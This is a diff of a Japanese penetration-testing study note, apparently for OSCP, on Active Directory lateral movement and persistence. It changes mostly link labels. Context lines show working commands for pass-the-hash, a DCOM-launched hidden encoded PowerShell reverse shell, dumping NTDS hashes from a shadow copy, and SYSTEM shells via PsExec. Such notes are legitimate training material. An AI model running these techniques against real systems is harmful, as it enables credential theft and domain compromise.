@@ -330,20 +330,20 @@ smbclient \\\\<target_IP>\\<SMB共有> -U <username> --pw-nt-hash <NTHash>
 
 # OptH (Overpass the Hash)
 
-[🥝Mimikatz](../../../Tools/🥝Mimikatz.md#OptH(Overpass-the-Hash))
+[OptH(Overpass-the-Hash)](../../../Tools/🥝Mimikatz.md#OptH(Overpass-the-Hash))
 
 ---
 
 # PtT (Pass the Ticket)
 
-[🥝Mimikatz](../../../Tools/🥝Mimikatz.md#PtT(Pass-the-Ticket))
+[PtT (Pass-the-Ticket)](../../../Tools/🥝Mimikatz.md#PtT(Pass-the-Ticket))
 
 ---
 
 # DCOM
 
-- [用語](../../../Misc/用語.md#COM・DCOM)
-- [用語](../../../Misc/用語.md#MMC)
+- [COM・DCOM](../../../Misc/用語.md#COM・DCOM)
+- [MMC](../../../Misc/用語.md#MMC)
 - さまざまなDCOMによる横展開テクニック：🔗[Cyberreason](https://www.cybereason.com/blog/dcom-lateral-movement-techniques)
 	- （ここではこれらのテクニックのうち、"MMC20.APPLICATION"について記載）
 
@@ -367,7 +367,7 @@ $dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Appl
 ```
 
 2. リバースシェルのコマンドを実行する
-	- [What is the shell](../../Common/What%20is%20the%20shell.md#Base64化したPowerShellリバースシェルワンライナー)
+	- [Base64化したPowerShellリバースシェルワンライナー](../../Common/What%20is%20the%20shell.md#Base64化したPowerShellリバースシェルワンライナー)
 ```powershell
 $dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"powershell -nop -w hidden -e <EncodedPayload>","7")
 ```
@@ -376,7 +376,7 @@ $dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"powershell -no
 
 # Golden Ticket
 
-永続化のために使うテクニック：[🥝Mimikatz](../../../Tools/🥝Mimikatz.md#Golden%20Ticket)
+永続化のために使うテクニック：[Golden Ticket](../../../Tools/🥝Mimikatz.md#Golden%20Ticket)
 
 ---
 
@@ -396,11 +396,11 @@ $dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"powershell -no
 - Domain Admins、Enterprise Admins、DCのローカルAdministratorsグループ、Domain Controllersのいずれかのユーザーの権限
 - DCにアクセスできること
 - `vshadow.exe`が利用できること
-	- ツールが存在しない場合は[自分のGitHubリポジトリ](https://github.com/LIsh3y3/obsidian_oscp/tree/main/OSCP/Tools/Binaries)から取得
 
 ## Shadow Copyからパスワードハッシュの取得
 
-🚨PowerShellでは以下の出力のパス解釈でエラーとなるため、cmd.exeで操作すること
+>[!WARNING]
+>PowerShellでは以下の出力のパス解釈でエラーとなるため、cmd.exeで操作すること
 
 1. DCにアクセスし、Shadow Copyを作成する
 ```cmd
@@ -430,7 +430,7 @@ impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL
 
 # DCSync
 
-永続化のために使うテクニック：[🥝Mimikatz](../../../Tools/🥝Mimikatz.md#DCSync攻撃)
+永続化のために使うテクニック：[DCSync攻撃](../../../Tools/🥝Mimikatz.md#DCSync攻撃)
 	Shadow Copyの取得よりはステルス
 
 ---
@@ -450,7 +450,7 @@ impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL
 
 1. ターゲットへの接続→管理者権限でコマンドプロンプトの起動
 2. PsExecを使用してSYSTEM権限のコマンドプロンプトを起動:
-	- [kali-windows-binaries - GitHub](https://github.com/interference-security/kali-windows-binaries)
+	- 🔗[kali-windows-binaries - GitHub](https://github.com/interference-security/kali-windows-binaries)
 ```powershell
 .\PsExec64.exe -s cmd.exe
 ```
@@ -485,7 +485,7 @@ tscon <セッションID> /dest:[現在のセッション名]
 
 - 条件
 	- 完全にインタラクティブなシェル（RDP等）にアクセス可能なとき
-		- 非インタラクティブシェルでは、パスワードプロンプトが入力を受け付けないので、[💥Lateral Movement & Persistance in AD](#RunasCs)等を使う
+		- 非インタラクティブシェルでは、パスワードプロンプトが入力を受け付けないので、[RunasCs](#RunasCs)等を使う
 
 基本コマンド
 ```cmd
@@ -505,7 +505,7 @@ $$/envを使った場合$$
 
 ### RunasCs
 
-[RunasCs - Github](https://github.com/antonioCoco/RunasCs)
+🔗[RunasCs - Github](https://github.com/antonioCoco/RunasCs)
 
 - 条件：**特になし**(サービスアカウントはそもそもログインできない)
 - ✅非インタラクティブシェルで別ユーザー権限のコマンド実行を可能にするツール
